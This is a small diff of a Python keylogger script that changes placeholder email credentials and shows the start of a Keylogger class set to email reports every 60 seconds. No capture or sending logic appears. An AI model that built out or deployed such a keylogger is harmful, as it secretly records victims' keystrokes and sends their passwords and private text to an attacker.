@@ -4,8 +4,8 @@ from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60 
-EMAIL_ADDRESS = "examplemail938@gmail.com"
-EMAIL_PASSWORD = "examplepassword"
+EMAIL_ADDRESS = "examplmail@gmail.com"
+EMAIL_PASSWORD = "explpass"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
